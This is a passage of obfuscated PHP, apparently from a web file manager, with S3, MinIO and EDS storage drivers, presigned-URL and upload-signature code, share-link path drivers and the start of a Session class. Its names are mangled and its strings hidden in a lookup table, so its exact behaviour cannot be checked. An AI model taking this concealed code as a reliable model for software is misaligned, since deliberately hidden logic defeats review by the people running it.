(!@is_dir($this->pathFather($ìíéºé)) && !IO::mkdir($this->pathFather($ìíéºé))) { return !1; } $´Õ²¤Û = $this->client->getObject($this->bucket, $ûè¹õŞ, array(), $ìíéºé); return $´Õ²¤Û !== !1 ? $ìíéºé : !1; } public function link($§›Ïµ¼, $ˆ·ï£¤„ = array()) { return $this->getPreSignedURL($§›Ïµ¼, 3600 * 12, $ˆ·ï£¤„); } private function getPreSignedURL($ÏÂ…Íş¤, $Ñı´£ñ¿, $ØÊô¨¦³ = array(), $³â® ïÅ = "\107\x45\124") { $óò•êƒı =& $_SERVER[ÔÕ±ĞšÎ]; $ÏÂ…Íş¤ = trim($ÏÂ…Íş¤, $óò•êƒı[8]); if ($this->signVer == $óò•êƒı[249]) { return $this->client->getPreSignedV2URL($this->bucket, $ÏÂ…Íş¤, $Ñı´£ñ¿, $³â® ïÅ, $ØÊô¨¦³); } return $this->client->getPreSignedV4URL($this->bucket, $ÏÂ…Íş¤, $Ñı´£ñ¿, array(), $³â® ïÅ, $ØÊô¨¦³); } public function fileOut($ÙÛ¡–·Ì, $áªÈÁŸŸ = false, $öîÏ×¡ = false, $×¸·óƒ’ = '') { $×ğĞ÷Â± =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÙÛ¡–·Ì, $áªÈÁŸŸ, $öîÏ×¡, $×¸·óƒ’); } if (!$öîÏ×¡) { $öîÏ×¡ = $this->pathThis($ÙÛ¡–·Ì); } $õ—âÑÂœ = get_file_mime(get_path_ext($öîÏ×¡)); if ($õ—âÑÂœ == $×ğĞ÷Â±[250]) { return parent::fileOut($ÙÛ¡–·Ì, $áªÈÁŸŸ, $öîÏ×¡, $×¸·óƒ’); } $ú‡§õ¡– = array($×ğĞ÷Â±[251] => $õ—âÑÂœ); if ($áªÈÁŸŸ) { $ú‡§õ¡–[$×ğĞ÷Â±[252]] = $×ğĞ÷Â±[253] . rawurlencode($öîÏ×¡); } else { } $÷Ó´Ä£é = $this->link($ÙÛ¡–·Ì, $ú‡§õ¡–); $this->fileOutLink($÷Ó´Ä£é); } public function fileOutServer($¬û¯¦Ì‡, $í‡º– = false, $Ş‰Ïş»Â = false, $æñÍßÃŒ = '') { parent::fileOut($¬û¯¦Ì‡, $í‡º–, $Ş‰Ïş»Â, $æñÍßÃŒ); } public function fileOutImageServer($›í€ÉŒ, $¶öÇÃÍÉ = 250) { parent::fileOutImage($›í€ÉŒ, $¶öÇÃÍÉ); } public function hashMd5($ºƒ…ã, $ÉÖ²€ãñ = '') { $‰ç°‘Ò² = $this->objectMeta($ºƒ…ã); if (!$‰ç°‘Ò²) { return !1; } $ÉÖ²€ãñ = $ÉÖ²€ãñ ? $ÉÖ²€ãñ : _get($‰ç°‘Ò², $_SERVER[ÔÕ±ĞšÎ][254]); return $ÉÖ²€ãñ; } public function uploadFormData($œ²ÅÜ¦, $ùÈ — = 3600) { $¡¨ÑİÅÍ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->_isClientAsync()) { $Çëİ—ç‹ = $this->getPreSignedURL($œ²ÅÜ¦, $ùÈ —, array(), $¡¨ÑİÅÍ[255]); return array($¡¨ÑİÅÍ[208] => str_replace($¡¨ÑİÅÍ[218], $¡¨ÑİÅÍ[256], $Çëİ—ç‹)); } if (isset($GLOBALS[$¡¨ÑİÅÍ[6]][$¡¨ÑİÅÍ[92]][$¡¨ÑİÅÍ[257]]) && $GLOBALS[$¡¨ÑİÅÍ[6]][$¡¨ÑİÅÍ[92]][$¡¨ÑİÅÍ[257]] == $¡¨ÑİÅÍ[230]) { return $this->uploadMultiData($œ²ÅÜ¦, $ùÈ —); } if ($this->signVer == $¡¨ÑİÅÍ[249]) { return $this->uploadFormDataV2($œ²ÅÜ¦, $ùÈ —); } return $this->uploadFormDataV4($œ²ÅÜ¦, $ùÈ —); } public function uploadFormDataV2($©íšÌ±ë, $ËÓ÷è®È = 3600) { $Î–ËşˆÛ =& $_SERVER[ÔÕ±ĞšÎ]; $ÎŞÀ”Ûå = $this->pathFather($©íšÌ±ë); $üšıé„ = $this->client->getHttpUploadPostParams($this->bucket, $ÎŞÀ”Ûå, $Î–ËşˆÛ[231], $ËÓ÷è®È); $Ëµ·‚É™ = array_merge((array) $üšıé„, array($Î–ËşˆÛ[258] => $Î–ËşˆÛ[249], $Î–ËşˆÛ[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($Ëµ·‚É™[$Î–ËşˆÛ[258]]); } return $Ëµ·‚É™; } public function uploadFormDataV4($¦œ¸äÄœ, $úë©ÀÚÓ = 3600) { $İñƒó•§ =& $_SERVER[ÔÕ±ĞšÎ]; $¤ÕûÜÇÇ = $İñƒó•§[231]; $öË¯¥ıï = $İñƒó•§[259]; $àªèô”© = $İñƒó•§[62]; $°šôÇê§ = gmdate($İñƒó•§[260]); $„³øÖÖ = gmdate($İñƒó•§[261]); $íœ°‹­ = $İñƒó•§[262]; $Šîîş• = $úë©ÀÚÓ . $İñƒó•§[12]; $şŞîó‚ê = $İñƒó•§[263]; $–î·ºÅü = array($this->accessKey, $„³øÖÖ, $this->region, $àªèô”©, $íœ°‹­); $üßÁĞìù = implode($İñƒó•§[8], $–î·ºÅü); $Ã±âç¾ = array($İñƒó•§[264] => gmdate($İñƒó•§[265], strtotime($İñƒó•§[266])), $İñƒó•§[267] => array(array($İñƒó•§[268] => $this->bucket), array($İñƒó•§[269], $İñƒó•§[270], $İñƒó•§[12]), array($İñƒó•§[269], $İñƒó•§[271], $İñƒó•§[12]), array($İñƒó•§[272] => $şŞîó‚ê), array($İñƒó•§[273] => $üßÁĞìù), array($İñƒó•§[274] => $öË¯¥ıï), array($İñƒó•§[275] => $°šôÇê§), array($İñƒó•§[276] => $Šîîş•))); $À§ñ´½Ï = base64_encode(json_encode($Ã±âç¾)); $Š†–£§ = hash_hmac($İñƒó•§[277], $„³øÖÖ, $İñƒó•§[278] . $this->secret, !0); $ĞÊğõáû = hash_hmac($İñƒó•§[277], $this->region, $Š†–£§, !0); $¤öéÉˆË = hash_hmac($İñƒó•§[277], $àªèô”©, $ĞÊğõáû, !0); $æíÀËè‰ = hash_hmac($İñƒó•§[277], $íœ°‹­, $¤öéÉˆË, !0); $Øâ‹ó¯· = hash_hmac($İñƒó•§[277], $À§ñ´½Ï, $æíÀËè‰); $™¥¿Ê£ = array($İñƒó•§[248] => $İñƒó•§[12], $İñƒó•§[272] => $şŞîó‚ê, $İñƒó•§[279] => $À§ñ´½Ï, $İñƒó•§[273] => $üßÁĞìù, $İñƒó•§[274] => $öË¯¥ıï, $İñƒó•§[275] => $°šôÇê§, $İñƒó•§[276] => $Šîîş•, $İñƒó•§[280] => $Øâ‹ó¯·, $İñƒó•§[258] => $İñƒó•§[249], $İñƒó•§[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($™¥¿Ê£[$İñƒó•§[258]]); } return $™¥¿Ê£; } public function uploadMultiData($şïîûÃæ, $—ñÃ§ = 3600) { $€ì¯ŠãË =& $_SERVER[ÔÕ±ĞšÎ]; $µ’È“í = $this->signVer == $€ì¯ŠãË[249] ? gmdate($€ì¯ŠãË[281]) : gmdate($€ì¯ŠãË[282]); $ÚÓ±ÜŸ = array(); $®ÕŞµë = $this->client->getUploadId($this->bucket, $şïîûÃæ, $ÚÓ±ÜŸ); if (!$®ÕŞµë) { return !1; } $şå‡ªá = array($€ì¯ŠãË[283] => $®ÕŞµë, $€ì¯ŠãË[208] => $this->getHost() . $€ì¯ŠãË[8] . $this->pathEncode($şïîûÃæ), $€ì¯ŠãË[284] => $µ’È“í, $€ì¯ŠãË[97] => $şïîûÃæ, $€ì¯ŠãË[258] => $this->signVer); if ($this->_isClientAsync()) { unset($şå‡ªá[$€ì¯ŠãË[258]]); } return $şå‡ªá; } public function uploadMultiAuth($åÈßİ¬ï, $ŠŞ«‰à = array()) { $Œ·®Àò =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->signVer == $Œ·®Àò[249]) { if (isset($ŠŞ«‰à[$Œ·®Àò[285]])) { return $this->uploadPartAuthV2($åÈßİ¬ï, $ŠŞ«‰à); } return $this->uploadListAuthV2($åÈßİ¬ï, $ŠŞ«‰à); } if (isset($ŠŞ«‰à[$Œ·®Àò[285]])) { return $this->uploadPartAuthV4($åÈßİ¬ï, $ŠŞ«‰à); } return $this->uploadListAuthV4($åÈßİ¬ï, $ŠŞ«‰à); } public function uploadPartAuthV2($Ü­×ÇÍ, $¨çååú = array()) { $·ÒĞØ´ =& $_SERVER[ÔÕ±ĞšÎ]; $©µŠòíÔ = $¨çååú[$·ÒĞØ´[97]]; $µâöîÛ = gmdate($·ÒĞØ´[281]); $‚©ƒ€© = array_intersect_key($¨çååú, array_flip(array($·ÒĞØ´[285], $·ÒĞØ´[283]))); ksort($‚©ƒ€©); $Ì¬ºÍ— = $‚©ƒ€© ? $·ÒĞØ´[76] . http_build_query($‚©ƒ€©, null, $·ÒĞØ´[286], PHP_QUERY_RFC3986) : $·ÒĞØ´[12]; $İ©÷–©… = array($·ÒĞØ´[255], $·ÒĞØ´[12], $·ÒĞØ´[123], $·ÒĞØ´[12], "\170\55\x61\155\172\x2d\144\141\164\x65\72{$µâöîÛ}", $·ÒĞØ´[8] . $this->bucket . $·ÒĞØ´[8] . $this->pathEncode($©µŠòíÔ) . $Ì¬ºÍ—); $¯ø¢¤Š¥ = implode($·ÒĞØ´[287], $İ©÷–©…); $òàô²úü = $this->client->__getSignature($¯ø¢¤Š¥); return array($·ÒĞØ´[288] => $òàô²úü, $·ÒĞØ´[284] => $µâöîÛ); } public function uploadListAuthV2($éÉÇèÇĞ, $ƒö¡±Ü = array()) { $ˆÌÜæ™ =& $_SERVER[ÔÕ±ĞšÎ]; $ğ€É“ = $ƒö¡±Ü[$ˆÌÜæ™[97]]; $µ›•ƒ¬Ø = $ƒö¡±Ü[$ˆÌÜæ™[283]]; $ûÃúª‡ = $this->client->listParts($this->bucket, $ğ€É“, $µ›•ƒ¬Ø); if (!$ûÃúª‡) { return !1; } $€›¶ØŸ = gmdate($ˆÌÜæ™[281]); $ëØ¨Óî = $ˆÌÜæ™[289] . $µ›•ƒ¬Ø; $µç×©¨É = array($ˆÌÜæ™[290], $ˆÌÜæ™[12], $ˆÌÜæ™[123], $ˆÌÜæ™[12], "\x78\55\141\x6d\172\x2d\144\141\164\145\x3a{$€›¶ØŸ}", $ˆÌÜæ™[8] . $this->bucket . $ˆÌÜæ™[8] . $this->pathEncode($ğ€É“) . $ëØ¨Óî); $Õæ´ğ„ = implode($ˆÌÜæ™[287], $µç×©¨É); $õı»Û‚õ = $this->client->__getSignature($Õæ´ğ„); return array($ˆÌÜæ™[288] => $õı»Û‚õ, $ˆÌÜæ™[284] => $€›¶ØŸ, $ˆÌÜæ™[291] => $ûÃúª‡); } public function uploadPartAuthV4($Ä—·¥, $´Ûáî ‘ = array()) { $Æ›¹°§Õ =& $_SERVER[ÔÕ±ĞšÎ]; $í…¿‘ÔŒ = $´Ûáî ‘[$Æ›¹°§Õ[97]]; $›ğ¾ê¶‚ = array($Æ›¹°§Õ[275] => gmdate($Æ›¹°§Õ[282]), $Æ›¹°§Õ[292] => _get($´Ûáî ‘, $Æ›¹°§Õ[293], hash($Æ›¹°§Õ[277], $Æ›¹°§Õ[12]))); $ß„†òº¼ = explode($Æ›¹°§Õ[210], $this->getHost()); $´ ±ñ“… = array($Æ›¹°§Õ[294] => $ß„†òº¼[1], $Æ›¹°§Õ[295] => $Æ›¹°§Õ[12], $Æ›¹°§Õ[248] => $Æ›¹°§Õ[123], $Æ›¹°§Õ[296] => $´Ûáî ‘[$Æ›¹°§Õ[79]]); $¹–İé¬§ = $Æ›¹°§Õ[255]; $ÇùŞ›æ± = $Æ›¹°§Õ[8] . $this->pathEncode($í…¿‘ÔŒ); $ñº©»¢ = array_intersect_key($´Ûáî ‘, array_flip(array($Æ›¹°§Õ[285], $Æ›¹°§Õ[283]))); $ˆÆÑ±ç³ = $this->client->__getSignatureV4($›ğ¾ê¶‚, $´ ±ñ“…, $¹–İé¬§, $ÇùŞ›æ±, $ñº©»¢); return array($Æ›¹°§Õ[288] => $ˆÆÑ±ç³, $Æ›¹°§Õ[292] => $›ğ¾ê¶‚[$Æ›¹°§Õ[292]], $Æ›¹°§Õ[284] => $›ğ¾ê¶‚[$Æ›¹°§Õ[275]]); } public function uploadListAuthV4($îõç¦Ëî, $Ï‚„Éùä = array()) { $­î‹›µ² =& $_SERVER[ÔÕ±ĞšÎ]; $º¿õ†æõ = $Ï‚„Éùä[$­î‹›µ²[97]]; $¿İØåÀ = $Ï‚„Éùä[$­î‹›µ²[283]]; $ÏßÜ¾Ãº = $this->client->listParts($this->bucket, $º¿õ†æõ, $¿İØåÀ); if (!$ÏßÜ¾Ãº) { return !1; } $§©ÂôÓó = $­î‹›µ²[297]; foreach ($ÏßÜ¾Ãº as $‡úÇè‡Í) { $§©ÂôÓó .= $­î‹›µ²[298] . "\x3c\x50\x61\162\x74\x4e\x75\155\x62\x65\162\x3e{$‡úÇè‡Í[$­î‹›µ²[299]]}\74\57\120\141\162\x74\116\165\x6d\142\x65\162\x3e\12" . "\x3c\105\x54\141\147\76{$‡úÇè‡Í[$­î‹›µ²[300]]}\x3c\x2f\x45\x54\x61\x67\x3e\xa" . $­î‹›µ²[301]; } $§©ÂôÓó .= $­î‹›µ²[302]; $¹Ûêğ“ğ = array($­î‹›µ²[275] => gmdate($­î‹›µ²[282]), $­î‹›µ²[292] => hash($­î‹›µ²[277], $§©ÂôÓó)); $§£¼Ä—Ş = explode($­î‹›µ²[210], $this->getHost()); $ƒÍØ… = array($­î‹›µ²[294] => $§£¼Ä—Ş[1], $­î‹›µ²[248] => $­î‹›µ²[123], $­î‹›µ²[296] => strlen($§©ÂôÓó)); $·“ÔŠßØ = $­î‹›µ²[290]; $ÎÕÑÏĞÅ = $­î‹›µ²[8] . $this->pathEncode($º¿õ†æõ); $½£èÕŒñ = array($­î‹›µ²[283] => $¿İØåÀ); $ô£‡’¢ = $this->client->__getSignatureV4($¹Ûêğ“ğ, $ƒÍØ…, $·“ÔŠßØ, $ÎÕÑÏĞÅ, $½£èÕŒñ); return array($­î‹›µ²[288] => $ô£‡’¢, $­î‹›µ²[292] => $¹Ûêğ“ğ[$­î‹›µ²[292]], $­î‹›µ²[284] => $¹Ûêğ“ğ[$­î‹›µ²[275]], $­î‹›µ²[291] => $ÏßÜ¾Ãº); } private function _isClientAsync() { $—†€Ğ§İ =& $_SERVER[ÔÕ±ĞšÎ]; static $½—ã´ÔË = null; if ($½—ã´ÔË === null) { $Ç¤õ´ûî = isset($_REQUEST[$—†€Ğ§İ[303]]) ? json_decode($_REQUEST[$—†€Ğ§İ[303]], !0) : !1; $½—ã´ÔË = $Ç¤õ´ûî && _get($Ç¤õ´ûî, $—†€Ğ§İ[304]) == $—†€Ğ§İ[305]; } return $½—ã´ÔË; } public function getHost() { $Ç¿åÅ¡¶ =& $_SERVER[ÔÕ±ĞšÎ]; $‘óè˜ç = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ç¿åÅ¡¶[70], $Ç¿åÅ¡¶[64], $Ç¿åÅ¡¶[69], $Ç¿åÅ¡¶[62]))) { return $‘óè˜ç . $Ç¿åÅ¡¶[8] . $this->bucket; } if ($this->osType == $Ç¿åÅ¡¶[62] && !is_domain($‘óè˜ç)) { return $‘óè˜ç . $Ç¿åÅ¡¶[8] . $this->bucket; } $‘óè˜ç = explode($Ç¿åÅ¡¶[210], $‘óè˜ç); return $‘óè˜ç[0] . $Ç¿åÅ¡¶[210] . $this->bucket . $Ç¿åÅ¡¶[10] . $‘óè˜ç[1]; } public function size($‘„Ñáò) { $ˆİÅ¯‘˜ = $this->objectMeta($‘„Ñáò); return $ˆİÅ¯‘˜ ? $ˆİÅ¯‘˜[$_SERVER[ÔÕ±ĞšÎ][79]] : 0; } public function info($®‘Á¼) { if ($this->isFolder($®‘Á¼)) { return $this->folderInfo($®‘Á¼); } else { if ($this->isFile($®‘Á¼)) { return $this->fileInfo($®‘Á¼); } } return !1; } public function exist($ÔşßÎô„) { return $this->isFile($ÔşßÎô„) || $this->isFolder($ÔşßÎô„); } public function isFile($ƒó‰œ‰‰) { return !$this->isFolder($ƒó‰œ‰‰) && $this->objectMeta($ƒó‰œ‰‰); } public function isFolder($ö…ó“´±) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][179], $ö…ó“´±); } protected function objectMeta($î¥€ºÜÎ) { return $this->cacheMethod($_SERVER[ÔÕ±ĞšÎ][181], $î¥€ºÜÎ); } protected function _objectMeta($·¥¬ùı«) { $Å’¿¦¡º =& $_SERVER[ÔÕ±ĞšÎ]; $·¥¬ùı« = rtrim($·¥¬ùı«, $Å’¿¦¡º[8]); try { $Ñ–ñ«í® = $this->client->getObjectInfo($this->bucket, $·¥¬ùı«); if (!isset($Ñ–ñ«í®[$Å’¿¦¡º[254]]) && isset($Ñ–ñ«í®[$Å’¿¦¡º[306]])) { $Ñ–ñ«í®[$Å’¿¦¡º[254]] = $Ñ–ñ«í®[$Å’¿¦¡º[306]]; } } catch (Exception $¥¦º¸‚Ù) { $Ñ–ñ«í® = !1; } if (!$Ñ–ñ«í®) { } return $Ñ–ñ«í®; } protected function _isFolder($âîÂì“†) { $ÆöÁïô‘ =& $_SERVER[ÔÕ±ĞšÎ]; $âîÂì“† = rtrim($âîÂì“†, $ÆöÁïô‘[8]) . $ÆöÁïô‘[8]; if ($âîÂì“† == $ÆöÁïô‘[12] || $âîÂì“† == $ÆöÁïô‘[8]) { return !0; } $ÕıÖ…¢ = $this->client->getBucket($this->bucket, $âîÂì“†, null, 1); if (empty($ÕıÖ…¢[$ÆöÁïô‘[238]])) { return !1; } $â§±ì¶ú = $ÕıÖ…¢[$ÆöÁïô‘[238]][0][$ÆöÁïô‘[32]]; return stripos($â§±ì¶ú, $âîÂì“†) === 0 ? !0 : !1; if (substr($â§±ì¶ú, -1) == $ÆöÁïô‘[8]) { return !0; } if (get_path_this($â§±ì¶ú) == get_path_this($âîÂì“†)) { return !1; } return !0; } public function listObject($£àíÒåƒ) { return $this->fileList($£àíÒåƒ, $_SERVER[ÔÕ±ĞšÎ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‡”å¤‡ì) { $ÚÒè¥ÛÎ =& $_SERVER[ÔÕ±ĞšÎ]; parent::__construct($‡”å¤‡ì); $this->setSignVersion($ÚÒè¥ÛÎ[249]); if (!$this->region) { $this->region = $ÚÒè¥ÛÎ[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $•ùÛ’„Ì = $this->getBktRegion(); return $this->region == $•ùÛ’„Ì ? !0 : !1; } public function uploadFormData($£Å­À¶÷, $Á°ˆÕÏÎ = 3600) { $„èŞ‡éù =& $_SERVER[ÔÕ±ĞšÎ]; $«ŸäØËÇ = $„èŞ‡éù[231]; $–¼Æí‰± = $„èŞ‡éù[259]; $˜ï¾õÔ¼ = $„èŞ‡éù[62]; $®„ãÊ¢„ = gmdate($„èŞ‡éù[260]); $àçŒ«°Ş = gmdate($„èŞ‡éù[261]); $ØÒË˜Ï½ = $„èŞ‡éù[262]; $ÔàÄÔæœ = $Á°ˆÕÏÎ . $„èŞ‡éù[12]; $ÁƒÕ©å = $„èŞ‡éù[263]; $§Ù£î¦ã = array($this->accessKey, $àçŒ«°Ş, $this->region, $˜ï¾õÔ¼, $ØÒË˜Ï½); $ƒÎÇ«º¶ = implode($„èŞ‡éù[8], $§Ù£î¦ã); $½‹ñŠºô = array($„èŞ‡éù[264] => gmdate($„èŞ‡éù[265], strtotime($„èŞ‡éù[266])), $„èŞ‡éù[267] => array(array($„èŞ‡éù[268] => $this->bucket), array($„èŞ‡éù[308] => $«ŸäØËÇ), array($„èŞ‡éù[269], $„èŞ‡éù[270], $„èŞ‡éù[12]), array($„èŞ‡éù[269], $„èŞ‡éù[271], $„èŞ‡éù[12]), array($„èŞ‡éù[269], $„èŞ‡éù[309], $„èŞ‡éù[12]), array($„èŞ‡éù[272] => $ÁƒÕ©å), array($„èŞ‡éù[273] => $ƒÎÇ«º¶), array($„èŞ‡éù[274] => $–¼Æí‰±), array($„èŞ‡éù[275] => $®„ãÊ¢„), array($„èŞ‡éù[276] => $ÔàÄÔæœ))); $âë¦À÷á = base64_encode(json_encode($½‹ñŠºô)); $åİ¤€Ë = hash_hmac($„èŞ‡éù[277], $àçŒ«°Ş, $„èŞ‡éù[278] . $this->secret, !0); $Şóáèâ = hash_hmac($„èŞ‡éù[277], $this->region, $åİ¤€Ë, !0); $Ï÷ƒ·Ï¼ = hash_hmac($„èŞ‡éù[277], $˜ï¾õÔ¼, $Şóáèâ, !0); $ÕÜ˜şË• = hash_hmac($„èŞ‡éù[277], $ØÒË˜Ï½, $Ï÷ƒ·Ï¼, !0); $Ó÷Ôãâ× = hash_hmac($„èŞ‡éù[277], $âë¦À÷á, $ÕÜ˜şË•); $êò¡ç±Œ = array($„èŞ‡éù[248] => $„èŞ‡éù[12], $„èŞ‡éù[296] => $„èŞ‡éù[12], $„èŞ‡éù[308] => $«ŸäØËÇ, $„èŞ‡éù[272] => $ÁƒÕ©å, $„èŞ‡éù[279] => $âë¦À÷á, $„èŞ‡éù[310] => $ƒÎÇ«º¶, $„èŞ‡éù[311] => $–¼Æí‰±, $„èŞ‡éù[312] => $®„ãÊ¢„, $„èŞ‡éù[313] => $ÔàÄÔæœ, $„èŞ‡éù[314] => $Ó÷Ôãâ×, $„èŞ‡éù[208] => $this->getHost()); return $êò¡ç±Œ; } } goto DÒ‚äÍÀ²ê; eÌã£Ú‰“Ó: class PathDriverDriverShareItem { public function __construct($°ò†”Î³) { $this->pathParse = $°ò†”Î³; } public function __call($ü˜ğş„, $Ò¬é£»ä) { $òûéÄ³¦ =& $_SERVER[ÔÕ±ĞšÎ]; if (method_exists($this, $ü˜ğş„)) { return; } $ÇĞüùÉª = call_user_func_array(array($òûéÄ³¦[1432], $ü˜ğş„), $Ò¬é£»ä); $ö»çƒá‰ = array($òûéÄ³¦[1433], $òûéÄ³¦[1434], $òûéÄ³¦[1435], $òûéÄ³¦[1436], $òûéÄ³¦[623], $òûéÄ³¦[625], $òûéÄ³¦[1437], $òûéÄ³¦[110], $òûéÄ³¦[1438], $òûéÄ³¦[1439]); if (in_array($ü˜ğş„, $ö»çƒá‰)) { $ÇĞüùÉª = $this->getPathOuter($ÇĞüùÉª); } return $ÇĞüùÉª; } public function copy($Ç¹ÒŸ£®, $”¿¥Ê¹â, $İîú ½„ = false, $ş™Ô©“ı = false) { return $this->copyMove($Ç¹ÒŸ£®, $”¿¥Ê¹â, $İîú ½„, $_SERVER[ÔÕ±ĞšÎ][623], $ş™Ô©“ı); } public function move($ûûã˜œ, $Ø‡†ŞöÇ, $ÚÊ„„ = false, $Åäœ¨ŞÌ = false) { return $this->copyMove($ûûã˜œ, $Ø‡†ŞöÇ, $ÚÊ„„, $_SERVER[ÔÕ±ĞšÎ][625], $Åäœ¨ŞÌ); } private function copyMove($ô‚º¦—, $İ ®“çù, $‚¡ı„», $­·±Ç‘£, $ÔÅ÷Ÿ’ = false) { $ˆ¶óØ¥Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $ûÚ·©„¸ = $İ ®“çù; $Ì§½Î = IO::driverMake($İ ®“çù); if ($Ì§½Î->pathParse[$ˆ¶óØ¥Ñ[1234]]) { $İ ®“çù = $Ì§½Î->pathParse[$ˆ¶óØ¥Ñ[1234]]; } else { $İ ®“çù = $ûÚ·©„¸; } $¾É€Û¬ª = IO::copyMove($ô‚º¦—, $İ ®“çù, $‚¡ı„», $­·±Ç‘£, $ÔÅ÷Ÿ’); $¾É€Û¬ª = $this->getPathOuter($¾É€Û¬ª); return $¾É€Û¬ª; } public function pathThis($îÓÔõÃ§) { return get_path_this($this->pathParse[$_SERVER[ÔÕ±ĞšÎ][87]]); } public function pathFather($„…÷ö˜×) { return get_path_father($this->pathParse[$_SERVER[ÔÕ±ĞšÎ][87]]); } public function iconvSystem($÷İá•—Û) { return $÷İá•—Û; } protected function infoParse($¤ñ†¸õÂ, $¹ÙÜ£ = false) { $·»ªŒ¬ =& $_SERVER[ÔÕ±ĞšÎ]; $ùøòÊÍ = $this->pathParse[$·»ªŒ¬[562]][$·»ªŒ¬[1259]] . $this->pathParse[$·»ªŒ¬[1252]]; if ($¹ÙÜ£) { $ğì†‚Ø = IO::infoWithChildren($ùøòÊÍ); } else { $ğì†‚Ø = IO::info($ùøòÊÍ); } $­Ö•½…á = $this->pathParse[$·»ªŒ¬[562]]; return Action($·»ªŒ¬[1430])->_shareItemeParse($ğì†‚Ø, $­Ö•½…á); } public function listAll($ã­ÇÙö±) { $ßÀ„ã¸À =& $_SERVER[ÔÕ±ĞšÎ]; $ÓĞØ•”Ü = IO::listAll($ã­ÇÙö±); $×Ë€Ï»£ = rtrim($this->pathParse[$ßÀ„ã¸À[562]][$ßÀ„ã¸À[1259]], $ßÀ„ã¸À[8]); foreach ($ÓĞØ•”Ü as &$è£”Êßè) { $è£”Êßè[$ßÀ„ã¸À[87]] = $this->pathDriver . $ßÀ„ã¸À[8] . ltrim(substr($è£”Êßè[$ßÀ„ã¸À[87]], strlen($×Ë€Ï»£)), $ßÀ„ã¸À[8]); } unset($è£”Êßè); return $ÓĞØ•”Ü; } public function listAllSimple($ùÖŸÈ¯ , $º¬Ç—¦‹ = false) { $¤ÑœœÍ =& $_SERVER[ÔÕ±ĞšÎ]; $¤õº•¢ş = $this->listAll($ùÖŸÈ¯ ); $íÒŠ†€² = $this->pathParse[$¤ÑœœÍ[497]]; if (trim($íÒŠ†€², $¤ÑœœÍ[8]) == trim(get_path_father($íÒŠ†€²), $¤ÑœœÍ[8])) { $º¬Ç—¦‹ = !0; } return IO::init($¤ÑœœÍ[12])->listAllSimpleMake($¤õº•¢ş, $íÒŠ†€², $º¬Ç—¦‹); } public function getPathOuter($ÏÖïæ’ô) { $¾ÒºÃê² =& $_SERVER[ÔÕ±ĞšÎ]; $„Ø£€è¨ = KodIO::parse($ÏÖïæ’ô); if ($„Ø£€è¨[$¾ÒºÃê²[33]] == KodIO::KOD_SHARE_ITEM) { return $„Ø£€è¨[$¾ÒºÃê²[87]]; } $”ŒÕ¢ = KodIO::clear($ÏÖïæ’ô); $±÷‘ƒÕš = KodIO::clear($this->pathParse[$¾ÒºÃê²[562]][$¾ÒºÃê²[1259]]); $êÜŒ§ŒÕ = substr($”ŒÕ¢, strlen($±÷‘ƒÕš)); if (substr($”ŒÕ¢, 0, strlen($±÷‘ƒÕš)) != $±÷‘ƒÕš) { return !1; } return $this->pathParse[$¾ÒºÃê²[1253]] . $¾ÒºÃê²[8] . ltrim($êÜŒ§ŒÕ, $¾ÒºÃê²[8]); } public function getType() { $ã—‘ä‡ =& $_SERVER[ÔÕ±ĞšÎ]; $¡èÁºÈ = str_replace($ã—‘ä‡[77], $ã—‘ä‡[12], get_class($this)); return strtolower($¡èÁºÈ); } public function isOsDriver($‰¾÷Ê É) { return IO::isOsDriver($‰¾÷Ê É); } public function info($çßøÎ­¥) { return $this->infoParse($çßøÎ­¥); } public function infoAuth($¾˜Å¾ã) { return $this->infoParse($¾˜Å¾ã); } public function infoWithChildren($¡•«ïí) { return $this->infoParse($¡•«ïí, !0); } public function infoFull($ƒÎÌ¼åÛ) { return $this->infoParse($ƒÎÌ¼åÛ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÀšèÎÑĞ) { $this->pathParse = $ÀšèÎÑĞ; } protected function infoParse($îÌÃ¾÷, $Õ´†À¥ = false) { $‚Ã¼ÙéÔ =& $_SERVER[ÔÕ±ĞšÎ]; return Action($‚Ã¼ÙéÔ[1258])->sharePathInfo($this->pathParse[$‚Ã¼ÙéÔ[87]], !0, $Õ´†À¥); } public function listPath($´ÁÌ©‰, $œƒ³ôò˜ = false) { $å“«É“ã =& $_SERVER[ÔÕ±ĞšÎ]; $Ş¶è°¸ø = IO::listPath($´ÁÌ©‰, $œƒ³ôò˜); if (!$Ş¶è°¸ø) { return $Ş¶è°¸ø; } if (is_array($Ş¶è°¸ø[$å“«É“ã[1431]])) { $î ¢ƒŒ° = Action($å“«É“ã[1440])->parsePathChildren($Ş¶è°¸ø[$å“«É“ã[1431]], array($å“«É“ã[497] => $´ÁÌ©‰)); $Ş¶è°¸ø[$å“«É“ã[1431]] = Action($å“«É“ã[1258])->shareItemInfo($î ¢ƒŒ°); } foreach ($Ş¶è°¸ø as $•«ÜÕ‚ö => $Ñ®Üƒˆ) { if (!in_array($•«ÜÕ‚ö, array($å“«É“ã[86], $å“«É“ã[85]))) { continue; } foreach ($Ñ®Üƒˆ as $°÷“›ê® => $î ¢ƒŒ°) { $î ¢ƒŒ° = Action($å“«É“ã[1440])->parsePathChildren($î ¢ƒŒ°, array($å“«É“ã[497] => $´ÁÌ©‰)); $Ş¶è°¸ø[$•«ÜÕ‚ö][$°÷“›ê®] = Action($å“«É“ã[1258])->shareItemInfo($î ¢ƒŒ°); } } return $Ş¶è°¸ø; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Âµº‘ÕË) { parent::__construct($Âµº‘ÕË); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } } goto cíì®™åªˆ; aÛÆå´šŸÌ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $½×ä¯ú =& $_SERVER[ÔÕ±ĞšÎ]; static $ü¶¯Ø—° = false; if ($ü¶¯Ø—°) { return $ü¶¯Ø—°; } 